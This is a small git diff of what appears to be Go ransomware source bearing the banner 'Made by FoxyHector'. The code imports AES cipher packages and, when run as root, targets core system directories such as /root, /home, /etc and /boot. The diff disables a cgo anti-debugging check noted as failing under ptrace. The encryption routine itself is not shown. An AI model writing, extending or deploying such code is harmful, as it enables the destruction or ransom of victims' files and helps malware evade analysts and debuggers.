@@ -3,8 +3,8 @@ package main
 /*
 #include "antidebug.h"
 */
-import "C"
-
+//import "C"
+// Doesn't work with PTRACE 
 import (
 	"crypto/aes"
 	"crypto/cipher"
@@ -79,7 +79,7 @@ RRRRRRRR     RRRRRRR        GGGGGG   GGGG     OOOOOOOOO
                               -------> Made by FoxyHector
 `
 	fmt.Printf("\t%s\n", banner)
-	C.check()
+	//C.check()
 	if os.Geteuid() == 0 {
 		fmt.Println("[+] Running as root!")
 		directories := []string{"/var", "/root", "/home", "/usr", "/bin", "/etc", "/boot"}
